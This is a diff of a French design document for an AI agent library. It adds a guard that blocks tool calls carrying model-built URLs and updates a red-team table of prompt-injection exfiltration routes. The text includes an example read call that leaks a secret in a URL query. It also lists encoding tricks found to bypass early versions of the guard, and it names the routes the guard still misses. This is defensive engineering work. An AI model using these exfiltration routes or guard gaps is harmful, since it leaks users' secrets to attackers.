@@ -2268,7 +2268,8 @@ autoagent/
 │                            # DocileProvider, injection_variant / injection_tasks (§42.1)
 ├── faults.py                # 0.24.0 — banc de pannes : FaultServer (vrai serveur HTTP local) + run_fault_bench (§42.2)
 ├── ws.py                    # 0.25.0 — client WebSocket synchrone RFC 6455, stdlib seule (§44)
-├── output_guard.py          # 0.25.0 — OutputGuard / guard_output : la garde du canal de la réponse (§47)
+├── output_guard.py          # 0.25.0 — OutputGuard / guard_output : la garde du canal de la réponse (§47) ;
+│                            # main (non publié) — guard_call_urls : la garde des URL d'appel, url_guard (§47.1)
 └── providers/
     ├── __init__.py          # create_provider (fabrique par nom)
     ├── base.py              # LLMProvider (ABC) + deep-merge de config.extra_body ;
@@ -2374,6 +2375,7 @@ from autoagent.faults import FaultServer, run_fault_bench, FAULT_CASES      # 0.
 from autoagent.ws import WebSocketClient, WebSocketClosed, WebSocketError   # 0.25.0 — WebSocket stdlib (§44)
 from autoagent.mcp import tool_fingerprint                                   # main (non publié) — empreinte d'un outil MCP (§17.1)
 from autoagent.output_guard import OutputGuard, guard_output                # 0.25.0 — garde du canal de la réponse (§47)
+from autoagent.output_guard import guard_call_urls                          # main (non publié) — garde des URL d'appel (§47.1)
 from autoagent.gate import delegation_taint                                 # 0.25.0 — la teinte qui descend (§46)
 ```
 
@@ -5124,7 +5126,7 @@ par CHAQUE route, un agent neuf par (attaque, route) :
 | `subagent` | demande l'envoi à un assistant courrier délégué (`as_tool`) qui détient `envoyer_message` | la teinte qui descend (0.25.0) |
 | `code` | un programme `run_python` qui appelle `envoyer_message` par `call_host` | la porte unique (§39) |
 | `output_url` | le code dans l'URL d'une image de sa réponse | `output_guard` (§47) |
-| `read_url` | LIT une URL qui porte le code (`lire_page`) | **aucune garde de la lib** |
+| `read_url` | LIT une URL qui porte le code (`lire_page`) | `url_guard` (§47.1) — rien avant elle |
 
 ```python
 from autoagent import Agent
@@ -5138,10 +5140,11 @@ print(rapport.summary())        # un tableau attaque x route (C compromis, B blo
 **Mesuré** (hors ligne, 40 runs, 3 s) : sans garde, les 7 attaques visibles fuient par les 5 routes (contrôle positif).
 Gardes par défaut : `egress`, `subagent`, `code` bloquées ; **`output_url` et `read_url` ouvertes**. Avec
 `output_guard="neutralize"` : seule **`read_url`** reste ouverte — un GET dont l'URL porte le secret exfiltre comme un
-envoi, et aucune garde de la bibliothèque ne regarde l'URL d'une lecture. Remède côté hôte aujourd'hui : une
-`tool_policy` qui n'autorise l'outil de lecture que sur les URL attendues (un test le montre). Le banc VOIT aussi un trou
+envoi, et un outil de lecture n'est pas `egress`. C'est ce constat qui a fait écrire `url_guard` (§47.1) : avec elle,
+**aucune route ouverte**. Sans elle, une `tool_policy` qui n'autorise l'outil de lecture que sur les URL attendues la
+ferme aussi (un test le montre). Le banc VOIT aussi un trou
 qu'on rouvre : sans la teinte qui descend, la route `subagent` fuit ; avec `govern_host_calls=False`, la route `code`
-fuit. `tests/test_redteam_routes.py` (10 tests) ; 5 mutations du banc, toutes attrapées. Démo 38, partie 6.
+fuit. `tests/test_redteam_routes.py` (11 tests) ; 5 mutations du banc, toutes attrapées. Démo 38, partie 6.
 Limites : routes ÉNUMÉRÉES ; niveau 1 seulement (le modèle docile choisit la route — un vrai modèle peut en trouver
 d'autres, ou ne pas trouver celles-ci) ; aucune attaque adaptative en LANGUE contre un vrai modèle (ce serait des jetons).
 
@@ -5788,6 +5791,57 @@ sélection parmi des URL préparées par l'attaquant et présentes dans la page 
 `links_from_untrusted=False` le ferme) ; une URL de LECTURE (`lire_page(url)` est un appel d'outil) ; la voix ; un
 `>` dans une valeur d'attribut entre guillemets coupe la balise (le reste passe par le filet des URL nues). **Pas
 mesuré** : le taux de faux positifs sur les réponses d'un vrai modèle — c'est pourquoi la garde reste opt-in.
+
+### 47.1 La garde des URL d'appel — `url_guard` *(sur `main`, non publié)*
+
+Lire une URL, c'est aussi écrire. `lire_page("https://collecte…/p.png?d=SECRET")` exfiltre comme un envoi, et un outil
+de lecture n'est pas `egress` : la garde trifecta ne le voit pas. Le banc des routes (§42.1) trouvait cette route
+ouverte sous toutes les gardes de la bibliothèque.
+
+```python
+agent = Agent(provider, url_guard="deny")                                   # défaut : "off"
+agent = Agent(provider, url_guard=OutputGuard(allowed_hosts=("api.alyce.fr",), links_from_untrusted=False))
+```
+
+**La règle**, dans un run TEINTÉ seulement : un appel d'outil dont un argument porte une URL absente de la conversation
+est refusé (`UrlNotAllowed`, événement `url_guard_block` — genre, longueur, empreinte, jamais l'URL). Passent : une URL
+du message de l'utilisateur ou du prompt système, une URL rendue par un outil fiable, un hôte de `allowed_hosts`, et
+(sauf `links_from_untrusted=False`) un lien CITÉ par le contenu lu — suivre un lien d'une page reste possible. Une URL
+construite par le modèle (le secret dans la requête, le chemin ou l'hôte) ne figure nulle part : elle ne passe pas.
+
+- **Comparaison EXACTE**, sans les équivalences de la garde de la réponse. Dans une réponse, `&amp;`, la casse de
+  l'hôte ou un `/` final sont du bruit de rendu ; dans un appel, ce que l'outil reçoit part tel quel, et chaque
+  tolérance est un canal où coder le secret vers l'hôte de la page (des tabulations au milieu d'une URL citée, des
+  caractères écrits en entités). Une URL d'argument ne porte ni blanc ni caractère de contrôle.
+- **Un argument qui commence par une URL est jugé EN ENTIER** : `<URL citée> <secret>` est refusé (un client HTTP
+  encode l'espace et envoie le tout). Sont reconnus : schéma + `//`, `https:/hôte` (une barre), `//hôte`, `www.`,
+  et `hôte.tld/…` sans schéma ; les barres inverses ; les chemins UNC vers un hôte nommé. Un chemin Windows, un
+  ratio, une adresse de courriel n'en sont pas.
+- **Une seule définition** (`gate.url_guard_verdict`), appliquée par la boucle ET par la porte unique (§39) : un
+  programme du modèle qui assemble l'URL puis appelle l'outil par `call_host` est refusé à l'appel.
+- **Sous-agents** : la délégation d'un run teinté dont la demande porte l'URL est refusée chez le parent ; un
+  sous-agent gardé, appelé par un run teinté, ne tient pas sa DEMANDE pour une source fiable ; avec
+  `inherit_policy=True`, la garde du parent vaut pour les appels du sous-agent. Sans garde ni héritage, un sous-agent
+  qui construit l'URL lui-même la lit : pose la garde sur chaque agent qui détient un outil de lecture.
+- `shadow_guards=True` : observé (`url_guard_would_block`), pas appliqué. Fail-closed : une garde qui plante refuse ;
+  une valeur inconnue lève à la construction. Temps linéaire (un argument de 200 000 caractères : quelques ms).
+
+**Mesuré.** Banc des routes : avec `output_guard` + `url_guard`, **aucune route ouverte** (0 attaque sur 7), contre
+`read_url` ouverte sans elle. Une passe adverse faite pendant l'écriture a cassé la première version : neuf formes
+(`<URL citée> <secret>`, guillemet ou `<` avant le secret, `https:/hôte`…), puis deux canaux par l'encodage d'une URL
+citée (tabulations, entités HTML) qu'une comparaison tolérante laissait ouverts, et une expression régulière
+quadratique (`a.a.a…` : 0,16 s pour 4 000 caractères). Tout est fermé et figé : `tests/test_url_guard.py` (86 tests) ;
+12 mutations du code, toutes attrapées. **Sur un vrai modèle** (`deepseek-chat`, 11 nov. 2026, 13 runs, 23 232
+jetons) : une tâche légitime qui doit SUIVRE un lien cité par la page réussit 5 fois sur 5 sans la garde et 5 fois sur
+5 avec, aucun appel refusé à tort ; sous attaque (3 runs), aucune fuite — mais le modèle a ignoré l'ordre de lui-même :
+la garde n'a pas eu à agir. Cinq runs ne sont pas un taux de faux positifs.
+
+**Ce que ça ne voit pas.** Une URL passée en morceaux (`host=` et `path=` séparés) ; une requête de recherche en texte
+libre ; un identifiant que l'outil transforme lui-même en URL ; un hôte sans point ni schéma (`serveur/chemin`, une
+adresse IP en entier décimal — un outil de lecture devrait exiger un schéma) ; le choix parmi des URL préparées par
+l'attaquant et citées par la page (quelques bits par appel ; `links_from_untrusted=False` le ferme) ; une consigne en
+texte libre à un sous-agent non gardé. Un modèle qui construit légitimement une URL après avoir lu du contenu non
+fiable (une page 2, un identifiant d'API) est refusé : c'est le prix, d'où l'opt-in et `allowed_hosts`.
 
 ---
 *Doc maintenue par l'équipe Alyce R&D. Pour questions, ouvrir une issue sur le repo interne ou taper l'auteur sur Slack.*
